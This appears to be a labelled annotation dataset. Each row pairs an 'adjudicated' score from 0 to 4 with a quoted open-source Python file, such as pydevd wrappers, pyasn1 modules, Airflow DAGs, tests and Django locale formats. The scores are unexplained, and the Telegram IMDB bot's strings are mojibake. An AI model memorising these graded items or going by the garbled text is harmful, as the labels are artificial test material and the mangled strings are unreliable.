65	adjudicated	0	"from _pydev_bundle._pydev_saved_modules import threading


def wrapper(fun):

    def pydev_after_run_call():
        pass

    def inner(*args, **kwargs):
        fun(*args, **kwargs)
        pydev_after_run_call()

    return inner


def wrap_attr(obj, attr):
    t_save_start = getattr(obj, attr)
    setattr(obj, attr, wrapper(t_save_start))
    obj._pydev_run_patched = True


class ObjectWrapper(object):

    def __init__(self, obj):
        self.wrapped_object = obj
        try:
            import functools
            functools.update_wrapper(self, obj)
        except:
            pass

    def __getattr__(self, attr):
        orig_attr = getattr(self.wrapped_object, attr)  # .__getattribute__(attr)
        if callable(orig_attr):

            def patched_attr(*args, **kwargs):
                self.call_begin(attr)
                result = orig_attr(*args, **kwargs)
                self.call_end(attr)
                if result == self.wrapped_object:
                    return self
                return result

            return patched_attr
        else:
            return orig_attr

    def call_begin(self, attr):
        pass

    def call_end(self, attr):
        pass

    def __enter__(self):
        self.call_begin(""__enter__"")
        self.wrapped_object.__enter__()
        self.call_end(""__enter__"")

    def __exit__(self, exc_type, exc_val, exc_tb):
        self.call_begin(""__exit__"")
        self.wrapped_object.__exit__(exc_type, exc_val, exc_tb)


def factory_wrapper(fun):

    def inner(*args, **kwargs):
        obj = fun(*args, **kwargs)
        return ObjectWrapper(obj)

    return inner


def wrap_threads():
    # TODO: add wrappers for thread and _thread
    # import _thread as mod
    # print(""Thread imported"")
    # mod.start_new_thread = wrapper(mod.start_new_thread)
    threading.Lock = factory_wrapper(threading.Lock)
    threading.RLock = factory_wrapper(threading.RLock)

    # queue patching
    import queue  # @UnresolvedImport
    queue.Queue = factory_wrapper(queue.Queue)"
247	adjudicated	1	"#
# This file is part of pyasn1-modules software.
#
# Created by Russ Housley with assistance from asn1ate v.0.6.0.
#
# Copyright (c) 2019, Vigil Security, LLC
# License: http://snmplabs.com/pyasn1/license.html
#
# Securing Header Fields with S/MIME
#
# ASN.1 source from:
# https://www.rfc-editor.org/rfc/rfc7508.txt
# https://www.rfc-editor.org/errata/eid5875
#

from pyasn1.type import char
from pyasn1.type import constraint
from pyasn1.type import namedtype
from pyasn1.type import namedval
from pyasn1.type import univ

from pyasn1_modules import rfc5652

import string

MAX = float('inf')


class Algorithm(univ.Enumerated):
    namedValues = namedval.NamedValues(
        ('canonAlgorithmSimple', 0),
        ('canonAlgorithmRelaxed', 1)
    )


class HeaderFieldStatus(univ.Integer):
    namedValues = namedval.NamedValues(
        ('duplicated', 0),
        ('deleted', 1),
        ('modified', 2)
    )


class HeaderFieldName(char.VisibleString):
    subtypeSpec = (
        constraint.PermittedAlphabetConstraint(*string.printable) -
        constraint.PermittedAlphabetConstraint(':')
    )


class HeaderFieldValue(char.UTF8String):
    pass


class HeaderField(univ.Sequence):
    componentType = namedtype.NamedTypes(
        namedtype.NamedType('field-Name', HeaderFieldName()),
        namedtype.NamedType('field-Value', HeaderFieldValue()),
        namedtype.DefaultedNamedType('field-Status',
            HeaderFieldStatus().subtype(value='duplicated'))
    )


class HeaderFields(univ.SequenceOf):
    componentType = HeaderField()
    subtypeSpec = constraint.ValueSizeConstraint(1, MAX)


class SecureHeaderFields(univ.Set):
    componentType = namedtype.NamedTypes(
        namedtype.NamedType('canonAlgorithm', Algorithm()),
        namedtype.NamedType('secHeaderFields', HeaderFields())
    )


id_aa = univ.ObjectIdentifier((1, 2, 840, 113549, 1, 9, 16, 2, ))

id_aa_secureHeaderFieldsIdentifier = id_aa + (55, )



# Map of Attribute Type OIDs to Attributes added to the
# ones that are in rfc5652.py

_cmsAttributesMapUpdate = {
    id_aa_secureHeaderFieldsIdentifier: SecureHeaderFields(),
}

rfc5652.cmsAttributesMap.update(_cmsAttributesMapUpdate)
"
307	adjudicated	0	"CONSOLE_HTML_FORMAT = """"""\
<!DOCTYPE html>
<head>
<meta charset=""UTF-8"">
<style>
{stylesheet}
body {{
    color: {foreground};
    background-color: {background};
}}
</style>
</head>
<html>
<body>
    <pre style=""font-family:Menlo,'DejaVu Sans Mono',consolas,'Courier New',monospace""><code>{code}</code></pre>
</body>
</html>
""""""

CONSOLE_SVG_FORMAT = """"""\
<svg class=""rich-terminal"" viewBox=""0 0 {width} {height}"" xmlns=""http://www.w3.org/2000/svg"">
    <!-- Generated with Rich https://www.textualize.io -->
    <style>

    @font-face {{
        font-family: ""Fira Code"";
        src: local(""FiraCode-Regular""),
                url(""https://cdnjs.cloudflare.com/ajax/libs/firacode/6.2.0/woff2/FiraCode-Regular.woff2"") format(""woff2""),
                url(""https://cdnjs.cloudflare.com/ajax/libs/firacode/6.2.0/woff/FiraCode-Regular.woff"") format(""woff"");
        font-style: normal;
        font-weight: 400;
    }}
    @font-face {{
        font-family: ""Fira Code"";
        src: local(""FiraCode-Bold""),
                url(""https://cdnjs.cloudflare.com/ajax/libs/firacode/6.2.0/woff2/FiraCode-Bold.woff2"") format(""woff2""),
                url(""https://cdnjs.cloudflare.com/ajax/libs/firacode/6.2.0/woff/FiraCode-Bold.woff"") format(""woff"");
        font-style: bold;
        font-weight: 700;
    }}

    .{unique_id}-matrix {{
        font-family: Fira Code, monospace;
        font-size: {char_height}px;
        line-height: {line_height}px;
        font-variant-east-asian: full-width;
    }}

    .{unique_id}-title {{
        font-size: 18px;
        font-weight: bold;
        font-family: arial;
    }}

    {styles}
    </style>

    <defs>
    <clipPath id=""{unique_id}-clip-terminal"">
      <rect x=""0"" y=""0"" width=""{terminal_width}"" height=""{terminal_height}"" />
    </clipPath>
    {lines}
    </defs>

    {chrome}
    <g transform=""translate({terminal_x}, {terminal_y})"" clip-path=""url(#{unique_id}-clip-terminal)"">
    {backgrounds}
    <g class=""{unique_id}-matrix"">
    {matrix}
    </g>
    </g>
</svg>
""""""

_SVG_FONT_FAMILY = ""Rich Fira Code""
_SVG_CLASSES_PREFIX = ""rich-svg"""
96	adjudicated	0	"# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# ""License""); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.
from __future__ import annotations

import datetime
import warnings

from airflow.models import DAG
from airflow.operators.bash import BashOperator
from airflow.operators.subdag import SubDagOperator

#


def create_subdag_opt(main_dag):
    subdag_name = ""daily_job""
    subdag = DAG(
        dag_id=""."".join([dag_name, subdag_name]),
        start_date=start_date,
        schedule=None,
        max_active_tasks=2,
    )
    BashOperator(bash_command=""echo 1"", task_id=""daily_job_subdag_task"", dag=subdag)
    with warnings.catch_warnings(record=True):
        return SubDagOperator(
            task_id=subdag_name,
            subdag=subdag,
            dag=main_dag,
        )


dag_name = ""clear_subdag_test_dag""

start_date = datetime.datetime(2016, 1, 1)

dag = DAG(dag_id=dag_name, max_active_tasks=3, start_date=start_date, schedule=""0 0 * * *"")

daily_job_irrelevant = BashOperator(
    bash_command=""echo 1"",
    task_id=""daily_job_irrelevant"",
    dag=dag,
)

daily_job_downstream = BashOperator(
    bash_command=""echo 1"",
    task_id=""daily_job_downstream"",
    dag=dag,
)

daily_job = create_subdag_opt(main_dag=dag)

daily_job >> daily_job_downstream"
216	adjudicated	2	"from ._common import pytz_imported


class PytzUsageWarning(RuntimeWarning):
    """"""Warning raised when accessing features specific to ``pytz``'s interface.

    This warning is used to direct users of ``pytz``-specific features like the
    ``localize`` and ``normalize`` methods towards using the standard
    ``tzinfo`` interface, so that these shims can be replaced with one of the
    underlying libraries they are wrapping.
    """"""


class UnknownTimeZoneError(KeyError):
    """"""Raised when no time zone is found for a specified key.""""""


class InvalidTimeError(Exception):
    """"""The base class for exceptions related to folds and gaps.""""""


class AmbiguousTimeError(InvalidTimeError):
    """"""Exception raised when ``is_dst=None`` for an ambiguous time (fold).""""""


class NonExistentTimeError(InvalidTimeError):
    """"""Exception raised when ``is_dst=None`` for a non-existent time (gap).""""""


PYTZ_BASE_ERROR_MAPPING = {}


def _make_pytz_derived_errors(
    InvalidTimeError_=InvalidTimeError,
    AmbiguousTimeError_=AmbiguousTimeError,
    NonExistentTimeError_=NonExistentTimeError,
    UnknownTimeZoneError_=UnknownTimeZoneError,
):
    if PYTZ_BASE_ERROR_MAPPING or not pytz_imported():
        return

    import pytz

    class InvalidTimeError(InvalidTimeError_, pytz.InvalidTimeError):
        pass

    class AmbiguousTimeError(AmbiguousTimeError_, pytz.AmbiguousTimeError):
        pass

    class NonExistentTimeError(
        NonExistentTimeError_, pytz.NonExistentTimeError
    ):
        pass

    class UnknownTimeZoneError(
        UnknownTimeZoneError_, pytz.UnknownTimeZoneError
    ):
        pass

    PYTZ_BASE_ERROR_MAPPING.update(
        {
            InvalidTimeError_: InvalidTimeError,
            AmbiguousTimeError_: AmbiguousTimeError,
            NonExistentTimeError_: NonExistentTimeError,
            UnknownTimeZoneError_: UnknownTimeZoneError,
        }
    )


def get_exception(exc_type, msg):
    _make_pytz_derived_errors()

    out_exc_type = PYTZ_BASE_ERROR_MAPPING.get(exc_type, exc_type)

    return out_exc_type(msg)"
187	adjudicated	3	"#
# The Python Imaging Library.
# $Id$
#
# sequence support classes
#
# history:
# 1997-02-20 fl     Created
#
# Copyright (c) 1997 by Secret Labs AB.
# Copyright (c) 1997 by Fredrik Lundh.
#
# See the README file for information on usage and redistribution.
#

##


class Iterator:
    """"""
    This class implements an iterator object that can be used to loop
    over an image sequence.

    You can use the ``[]`` operator to access elements by index. This operator
    will raise an :py:exc:`IndexError` if you try to access a nonexistent
    frame.

    :param im: An image object.
    """"""

    def __init__(self, im):
        if not hasattr(im, ""seek""):
            msg = ""im must have seek method""
            raise AttributeError(msg)
        self.im = im
        self.position = getattr(self.im, ""_min_frame"", 0)

    def __getitem__(self, ix):
        try:
            self.im.seek(ix)
            return self.im
        except EOFError as e:
            raise IndexError from e  # end of sequence

    def __iter__(self):
        return self

    def __next__(self):
        try:
            self.im.seek(self.position)
            self.position += 1
            return self.im
        except EOFError as e:
            raise StopIteration from e


def all_frames(im, func=None):
    """"""
    Applies a given function to all frames in an image or a list of images.
    The frames are returned as a list of separate images.

    :param im: An image, or a list of images.
    :param func: The function to apply to all of the image frames.
    :returns: A list of images.
    """"""
    if not isinstance(im, list):
        im = [im]

    ims = []
    for imSequence in im:
        current = imSequence.tell()

        ims += [im_frame.copy() for im_frame in Iterator(imSequence)]

        imSequence.seek(current)
    return [func(im) for im in ims] if func else ims"
356	adjudicated	0	"#
# This file is part of pyasn1-modules software.
#
# Created by Russ Housley.
#
# Copyright (c) 2019, Vigil Security, LLC
# License: http://snmplabs.com/pyasn1/license.html
#
# RSAES-OAEP Key Transport Algorithm in CMS
#
# Notice that all of the things needed in RFC 3560 are also defined
# in RFC 4055.  So, they are all pulled from the RFC 4055 module into
# this one so that people looking a RFC 3560 can easily find them.
#
# ASN.1 source from:
# https://www.rfc-editor.org/rfc/rfc3560.txt
#

from pyasn1_modules import rfc4055

id_sha1 = rfc4055.id_sha1

id_sha256 = rfc4055.id_sha256

id_sha384 = rfc4055.id_sha384

id_sha512 = rfc4055.id_sha512

id_mgf1 = rfc4055.id_mgf1

rsaEncryption = rfc4055.rsaEncryption

id_RSAES_OAEP = rfc4055.id_RSAES_OAEP

id_pSpecified = rfc4055.id_pSpecified

sha1Identifier = rfc4055.sha1Identifier

sha256Identifier = rfc4055.sha256Identifier

sha384Identifier = rfc4055.sha384Identifier

sha512Identifier = rfc4055.sha512Identifier

mgf1SHA1Identifier = rfc4055.mgf1SHA1Identifier

mgf1SHA256Identifier = rfc4055.mgf1SHA256Identifier

mgf1SHA384Identifier = rfc4055.mgf1SHA384Identifier

mgf1SHA512Identifier = rfc4055.mgf1SHA512Identifier

pSpecifiedEmptyIdentifier = rfc4055.pSpecifiedEmptyIdentifier


class RSAES_OAEP_params(rfc4055.RSAES_OAEP_params):
    pass


rSAES_OAEP_Default_Params = RSAES_OAEP_params()

rSAES_OAEP_Default_Identifier = rfc4055.rSAES_OAEP_Default_Identifier

rSAES_OAEP_SHA256_Params = rfc4055.rSAES_OAEP_SHA256_Params

rSAES_OAEP_SHA256_Identifier = rfc4055.rSAES_OAEP_SHA256_Identifier

rSAES_OAEP_SHA384_Params = rfc4055.rSAES_OAEP_SHA384_Params

rSAES_OAEP_SHA384_Identifier = rfc4055.rSAES_OAEP_SHA384_Identifier

rSAES_OAEP_SHA512_Params = rfc4055.rSAES_OAEP_SHA512_Params

rSAES_OAEP_SHA512_Identifier = rfc4055.rSAES_OAEP_SHA512_Identifier"
418	adjudicated	4	"#
# Copyright 2011 Facebook
#
# Licensed under the Apache License, Version 2.0 (the ""License""); you may
# not use this file except in compliance with the License. You may obtain
# a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS, WITHOUT
# WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the
# License for the specific language governing permissions and limitations
# under the License.

""""""Implementation of platform-specific functionality.

For each function or class described in `tornado.platform.interface`,
the appropriate platform-specific implementation exists in this module.
Most code that needs access to this functionality should do e.g.::

    from tornado.platform.auto import set_close_exec
""""""

from __future__ import absolute_import, division, print_function

import os

if 'APPENGINE_RUNTIME' in os.environ:
    from tornado.platform.common import Waker

    def set_close_exec(fd):
        pass
elif os.name == 'nt':
    from tornado.platform.common import Waker
    from tornado.platform.windows import set_close_exec
else:
    from tornado.platform.posix import set_close_exec, Waker

try:
    # monotime monkey-patches the time module to have a monotonic function
    # in versions of python before 3.3.
    import monotime
    # Silence pyflakes warning about this unused import
    monotime
except ImportError:
    pass
try:
    # monotonic can provide a monotonic function in versions of python before
    # 3.3, too.
    from monotonic import monotonic as monotonic_time
except ImportError:
    try:
        from time import monotonic as monotonic_time
    except ImportError:
        monotonic_time = None

__all__ = ['Waker', 'set_close_exec', 'monotonic_time']"
509	adjudicated	1	"#
# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# ""License""); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.
""""""Example DAG demonstrating the usage of the BranchPythonOperator.""""""
from __future__ import annotations

import random

import pendulum

from airflow import DAG
from airflow.operators.empty import EmptyOperator
from airflow.operators.python import BranchPythonOperator
from airflow.utils.edgemodifier import Label
from airflow.utils.trigger_rule import TriggerRule

with DAG(
    dag_id=""example_branch_operator"",
    start_date=pendulum.datetime(2021, 1, 1, tz=""UTC""),
    catchup=False,
    schedule=""@daily"",
    tags=[""example"", ""example2""],
) as dag:
    run_this_first = EmptyOperator(
        task_id=""run_this_first"",
    )

    options = [""branch_a"", ""branch_b"", ""branch_c"", ""branch_d""]

    branching = BranchPythonOperator(
        task_id=""branching"",
        python_callable=lambda: random.choice(options),
    )
    run_this_first >> branching

    join = EmptyOperator(
        task_id=""join"",
        trigger_rule=TriggerRule.NONE_FAILED_MIN_ONE_SUCCESS,
    )

    for option in options:
        t = EmptyOperator(
            task_id=option,
        )

        empty_follow = EmptyOperator(
            task_id=""follow_"" + option,
        )

        # Label is optional here, but it can help identify more complex branches
        branching >> Label(option) >> t >> empty_follow >> join"
449	adjudicated	1	"""""""distutils.command.install_scripts

Implements the Distutils 'install_scripts' command, for installing
Python scripts.""""""

# contributed by Bastian Kleineidam

import os
from distutils.core import Command
from distutils import log
from stat import ST_MODE


class install_scripts(Command):
    description = ""install scripts (Python or otherwise)""

    user_options = [
        (""install-dir="", ""d"", ""directory to install scripts to""),
        (""build-dir="", ""b"", ""build directory (where to install from)""),
        (""force"", ""f"", ""force installation (overwrite existing files)""),
        (""skip-build"", None, ""skip the build steps""),
    ]

    boolean_options = [""force"", ""skip-build""]

    def initialize_options(self):
        self.install_dir = None
        self.force = 0
        self.build_dir = None
        self.skip_build = None

    def finalize_options(self):
        self.set_undefined_options(""build"", (""build_scripts"", ""build_dir""))
        self.set_undefined_options(
            ""install"",
            (""install_scripts"", ""install_dir""),
            (""force"", ""force""),
            (""skip_build"", ""skip_build""),
        )

    def run(self):
        if not self.skip_build:
            self.run_command(""build_scripts"")
        self.outfiles = self.copy_tree(self.build_dir, self.install_dir)
        if os.name == ""posix"":
            # Set the executable bits (owner, group, and world) on
            # all the scripts we just installed.
            for file in self.get_outputs():
                if self.dry_run:
                    log.info(""changing mode of %s"", file)
                else:
                    mode = ((os.stat(file)[ST_MODE]) | 0o555) & 0o7777
                    log.info(""changing mode of %s to %o"", file, mode)
                    os.chmod(file, mode)

    def get_inputs(self):
        return self.distribution.scripts or []

    def get_outputs(self):
        return self.outfiles or []"
459	adjudicated	1	"# This source code is licensed under the MIT license found in the
# LICENSE file in the root directory of this source tree.

import os
import shutil
import sys
import tempfile
import unittest
from typing import Optional
from unittest.mock import MagicMock


class TestFileIO(unittest.TestCase):

    _tmpdir: Optional[str] = None
    _tmpfile: Optional[str] = None
    _tmpfile_contents = ""Hello, World""

    @classmethod
    def setUpClass(cls) -> None:
        cls._tmpdir = tempfile.mkdtemp()
        with open(os.path.join(cls._tmpdir, ""test.txt""), ""w"") as f:
            cls._tmpfile = f.name
            f.write(cls._tmpfile_contents)
            f.flush()

    @classmethod
    def tearDownClass(cls) -> None:
        # Cleanup temp working dir.
        if cls._tmpdir is not None:
            shutil.rmtree(cls._tmpdir)  # type: ignore

    def test_file_io(self):
        from fairseq.file_io import PathManager

        with PathManager.open(os.path.join(self._tmpdir, ""test.txt""), ""r"") as f:
            s = f.read()
        self.assertEqual(s, self._tmpfile_contents)

    def test_file_io_oss(self):
        # Mock iopath to simulate oss environment.
        sys.modules[""iopath""] = MagicMock()
        from fairseq.file_io import PathManager

        with PathManager.open(os.path.join(self._tmpdir, ""test.txt""), ""r"") as f:
            s = f.read()
        self.assertEqual(s, self._tmpfile_contents)

    def test_file_io_async(self):
        # ioPath `PathManager` is initialized after the first `opena` call.
        try:
            from fairseq.file_io import IOPathManager, PathManager
            _asyncfile = os.path.join(self._tmpdir, ""async.txt"")
            f = PathManager.opena(_asyncfile, ""wb"")
            f.close()

        finally:
            self.assertTrue(PathManager.async_close())"
408	adjudicated	0	"# Copyright Jonathan Hartley 2013. BSD 3-Clause license, see LICENSE file.
import atexit
import contextlib
import sys

from .ansitowin32 import AnsiToWin32


orig_stdout = None
orig_stderr = None

wrapped_stdout = None
wrapped_stderr = None

atexit_done = False


def reset_all():
    if AnsiToWin32 is not None:  # Issue #74: objects might become None at exit
        AnsiToWin32(orig_stdout).reset_all()


def init(autoreset=False, convert=None, strip=None, wrap=True):
    if not wrap and any([autoreset, convert, strip]):
        raise ValueError(""wrap=False conflicts with any other arg=True"")

    global wrapped_stdout, wrapped_stderr
    global orig_stdout, orig_stderr

    orig_stdout = sys.stdout
    orig_stderr = sys.stderr

    if sys.stdout is None:
        wrapped_stdout = None
    else:
        sys.stdout = wrapped_stdout = wrap_stream(
            orig_stdout, convert, strip, autoreset, wrap
        )
    if sys.stderr is None:
        wrapped_stderr = None
    else:
        sys.stderr = wrapped_stderr = wrap_stream(
            orig_stderr, convert, strip, autoreset, wrap
        )

    global atexit_done
    if not atexit_done:
        atexit.register(reset_all)
        atexit_done = True


def deinit():
    if orig_stdout is not None:
        sys.stdout = orig_stdout
    if orig_stderr is not None:
        sys.stderr = orig_stderr


@contextlib.contextmanager
def colorama_text(*args, **kwargs):
    init(*args, **kwargs)
    try:
        yield
    finally:
        deinit()


def reinit():
    if wrapped_stdout is not None:
        sys.stdout = wrapped_stdout
    if wrapped_stderr is not None:
        sys.stderr = wrapped_stderr


def wrap_stream(stream, convert, strip, autoreset, wrap):
    if wrap:
        wrapper = AnsiToWin32(stream, convert=convert, strip=strip, autoreset=autoreset)
        if wrapper.should_wrap():
            stream = wrapper.stream
    return stream"
346	adjudicated	1	"from textwrap import dedent

from flaky import flaky

from .test_embed_kernel import setup_kernel

TIMEOUT = 15


@flaky(max_runs=3)
def test_ipython_start_kernel_userns():
    cmd = dedent(
        """"""
        from ipykernel.kernelapp import launch_new_instance
        ns = {""tre"": 123}
        launch_new_instance(user_ns=ns)
        """"""
    )

    with setup_kernel(cmd) as client:
        client.inspect(""tre"")
        msg = client.get_shell_msg(timeout=TIMEOUT)
        content = msg[""content""]
        assert content[""found""]
        text = content[""data""][""text/plain""]
        assert ""123"" in text

        # user_module should be an instance of DummyMod
        client.execute(""usermod = get_ipython().user_module"")
        msg = client.get_shell_msg(timeout=TIMEOUT)
        content = msg[""content""]
        assert content[""status""] == ""ok""
        client.inspect(""usermod"")
        msg = client.get_shell_msg(timeout=TIMEOUT)
        content = msg[""content""]
        assert content[""found""]
        text = content[""data""][""text/plain""]
        assert ""DummyMod"" in text


@flaky(max_runs=3)
def test_ipython_start_kernel_no_userns():
    # Issue #4188 - user_ns should be passed to shell as None, not {}
    cmd = dedent(
        """"""
        from ipykernel.kernelapp import launch_new_instance
        launch_new_instance()
        """"""
    )

    with setup_kernel(cmd) as client:
        # user_module should not be an instance of DummyMod
        client.execute(""usermod = get_ipython().user_module"")
        msg = client.get_shell_msg(timeout=TIMEOUT)
        content = msg[""content""]
        assert content[""status""] == ""ok""
        client.inspect(""usermod"")
        msg = client.get_shell_msg(timeout=TIMEOUT)
        content = msg[""content""]
        assert content[""found""]
        text = content[""data""][""text/plain""]
        assert ""DummyMod"" not in text"
197	adjudicated	1	"import requests
from requests.exceptions import JSONDecodeError, ConnectionError

from pyrogram import filters
from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup

from HotspotRobot import pbot, SUPPORT_CHAT


@pbot.on_message(filters.command(""imdb""))
async def imdb(client, message):
    text = message.text.split("" "", 1)
    if len(text) == 1:
        return await message.reply_text(""Â» É¢Éªá´ á´ á´á´ ê±á´á´á´ á´á´á´ Éªá´ É´á´á´á´.\n   á´x. /imdb Altron"")

    try:
        response = requests.get(f""https://api.safone.me/tmdb?query={text[1]}"").json()[""results""][0]
    except (JSONDecodeError, ConnectionError) as e:
        return await message.reply_text(
            f""**Some Error Occured:** á´Êá´á´ê±á´ Êá´á´á´Êá´ Éªá´ á´á´ á´á´Ê [ê±á´á´á´á´Êá´ á´Êá´á´](https://t.me/{SUPPORT_CHAT}).""
            f""\n\n**Error:** {e}""
            )

    poster = response[""poster""]
    imdb_link = response[""imdbLink""]
    title = response[""title""]
    rating = response[""rating""]
    releasedate = response[""releaseDate""]
    description = response[""overview""]
    popularity = response[""popularity""]
    runtime = response[""runtime""]
    status = response[""status""]

    await client.send_photo(
        message.chat.id,
        poster,
        caption=f""""""**Â» IMDB Movie Details:**

â£ **Title** = `{title}`
â£ **Description** = `{description}`
â£ **Rating** = `{rating}`
â£ **Release-Date** = `{releasedate}`
â£ **Popularity** = `{popularity}`
â£ **Runtime** = `{runtime}`
â£ **Status** = `{status}`
"""""",
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(text=""â¢ Éªá´á´Ê ÊÉªÉ´á´ â¢"", url=imdb_link)]])
    )


__help__ = """"""
  â² /imdb <á´á´á´ Éªá´ É´á´á´á´>: É¢á´á´ ê°á´ÊÊ ÉªÉ´ê°á´ á´Êá´á´á´ á´ á´á´á´ Éªá´ ê°Êá´á´ [imdb.com](https://m.imdb.com)
""""""
__mod_name__ = ""Iá´á´Ê"""
206	adjudicated	1	"#!/usr/bin/env python
# SPDX-License-Identifier: ISC

#
# Copyright (c) 2023 by
# Donatas Abraitis <donatas@opensourcerouting.org>
#

""""""
Check if IPv6 Link-Local BGP peering works fine.
""""""

import os
import sys
import json
import pytest
import functools

CWD = os.path.dirname(os.path.realpath(__file__))
sys.path.append(os.path.join(CWD, ""../""))

# pylint: disable=C0413
from lib import topotest
from lib.topogen import Topogen, TopoRouter, get_topogen

pytestmark = [pytest.mark.bgpd]


def build_topo(tgen):
    for routern in range(1, 3):
        tgen.add_router(""r{}"".format(routern))

    switch = tgen.add_switch(""s1"")
    switch.add_link(tgen.gears[""r1""])
    switch.add_link(tgen.gears[""r2""])


def setup_module(mod):
    tgen = Topogen(build_topo, mod.__name__)
    tgen.start_topology()

    router_list = tgen.routers()

    for i, (rname, router) in enumerate(router_list.items(), 1):
        router.load_config(
            TopoRouter.RD_ZEBRA, os.path.join(CWD, ""{}/zebra.conf"".format(rname))
        )
        router.load_config(
            TopoRouter.RD_BGP, os.path.join(CWD, ""{}/bgpd.conf"".format(rname))
        )

    tgen.start_router()


def teardown_module(mod):
    tgen = get_topogen()
    tgen.stop_topology()


def test_bgp_ipv6_link_local_peering():
    tgen = get_topogen()

    if tgen.routers_have_failure():
        pytest.skip(tgen.errors)

    r1 = tgen.gears[""r1""]

    def _bgp_converge():
        output = json.loads(r1.vtysh_cmd(""show bgp summary json""))
        expected = {
            ""ipv4Unicast"": {
                ""peers"": {
                    ""fe80:1::2"": {
                        ""state"": ""Established"",
                    }
                }
            }
        }
        return topotest.json_cmp(output, expected)

    test_func = functools.partial(_bgp_converge)
    _, result = topotest.run_and_expect(test_func, None, count=60, wait=0.5)
    assert result is None, ""Failed to see BGP convergence on R2""


if __name__ == ""__main__"":
    args = [""-s""] + sys.argv[1:]
    sys.exit(pytest.main(args))"
86	adjudicated	1	"import cairo
from color import Color, palette
import numpy as np


def set_color(cr, color, a=1):
    if color.a == 1.0:
        cr.set_source_rgba(color.r, color.g, color.b, a)
    else:
        cr.set_source_rgba(color.r, color.g, color.b, color.a)


def draw_px_cross(cr, x, y, length_px, color=palette[""RED""]):
    """"""Draws a cross with fixed dimensions in pixel space.""""""
    set_color(cr, color)
    cr.move_to(x, y - length_px)
    cr.line_to(x, y + length_px)
    cr.stroke()

    cr.move_to(x - length_px, y)
    cr.line_to(x + length_px, y)
    cr.stroke()
    set_color(cr, palette[""WHITE""])


def draw_px_x(cr, x, y, length_px1, color=palette[""BLACK""]):
    """"""Draws a x with fixed dimensions in pixel space.""""""
    length_px = length_px1 / np.sqrt(2)
    set_color(cr, color)
    cr.move_to(x - length_px, y - length_px)
    cr.line_to(x + length_px, y + length_px)
    cr.stroke()

    cr.move_to(x - length_px, y + length_px)
    cr.line_to(x + length_px, y - length_px)
    cr.stroke()
    set_color(cr, palette[""WHITE""])


def draw_circle(cr, x, y, radius, color=palette[""RED""]):
    set_color(cr, color)
    cr.arc(x, y, radius, 0, 2 * np.pi)
    cr.fill()
    cr.stroke()


def draw_control_points_cross(cr,
                              points,
                              width=10,
                              radius=4,
                              color=palette[""BLUE""]):
    for i in range(0, len(points)):
        draw_px_x(cr, points[i][0], points[i][1], width, color)
        set_color(cr, color)
        cr.arc(points[i][0], points[i][1], radius, 0, 2.0 * np.pi)
        cr.fill()
        set_color(cr, palette[""WHITE""])


def display_text(cr, text, widtha, heighta, widthb, heightb):
    cr.scale(widtha, -heighta)
    cr.show_text(text)
    cr.scale(widthb, -heightb)


def draw_points(cr, p, size):
    for i in range(0, len(p)):
        draw_px_cross(cr, p[i][0], p[i][1], size,
                      Color(0, np.sqrt(0.2 * i), 0))"
317	adjudicated	4	"# This file is distributed under the same license as the Django package.
#
# The *_FORMAT strings use the Django date format syntax,
# see https://docs.djangoproject.com/en/dev/ref/templates/builtins/#date
DATE_FORMAT = r'j\-\a \d\e F Y'         # '26-a de julio 1887'
TIME_FORMAT = 'H:i'                     # '18:59'
DATETIME_FORMAT = r'j\-\a \d\e F Y\, \j\e H:i'  # '26-a de julio 1887, je 18:59'
YEAR_MONTH_FORMAT = r'F \d\e Y'         # 'julio de 1887'
MONTH_DAY_FORMAT = r'j\-\a \d\e F'      # '26-a de julio'
SHORT_DATE_FORMAT = 'Y-m-d'             # '1887-07-26'
SHORT_DATETIME_FORMAT = 'Y-m-d H:i'     # '1887-07-26 18:59'
FIRST_DAY_OF_WEEK = 1  # Monday (lundo)

# The *_INPUT_FORMATS strings use the Python strftime format syntax,
# see https://docs.python.org/library/datetime.html#strftime-strptime-behavior
DATE_INPUT_FORMATS = [
    '%Y-%m-%d',                         # '1887-07-26'
    '%y-%m-%d',                         # '87-07-26'
    '%Y %m %d',                         # '1887 07 26'
    '%Y.%m.%d',                         # '1887.07.26'
    '%d-a de %b %Y',                    # '26-a de jul 1887'
    '%d %b %Y',                         # '26 jul 1887'
    '%d-a de %B %Y',                    # '26-a de julio 1887'
    '%d %B %Y',                         # '26 julio 1887'
    '%d %m %Y',                         # '26 07 1887'
    '%d/%m/%Y',                         # '26/07/1887'
]
TIME_INPUT_FORMATS = [
    '%H:%M:%S',                         # '18:59:00'
    '%H:%M',                            # '18:59'
]
DATETIME_INPUT_FORMATS = [
    '%Y-%m-%d %H:%M:%S',                # '1887-07-26 18:59:00'
    '%Y-%m-%d %H:%M',                   # '1887-07-26 18:59'

    '%Y.%m.%d %H:%M:%S',                # '1887.07.26 18:59:00'
    '%Y.%m.%d %H:%M',                   # '1887.07.26 18:59'

    '%d/%m/%Y %H:%M:%S',                # '26/07/1887 18:59:00'
    '%d/%m/%Y %H:%M',                   # '26/07/1887 18:59'

    '%y-%m-%d %H:%M:%S',                # '87-07-26 18:59:00'
    '%y-%m-%d %H:%M',                   # '87-07-26 18:59'
]
DECIMAL_SEPARATOR = ','
THOUSAND_SEPARATOR = '\xa0'  # non-breaking space
NUMBER_GROUPING = 3"
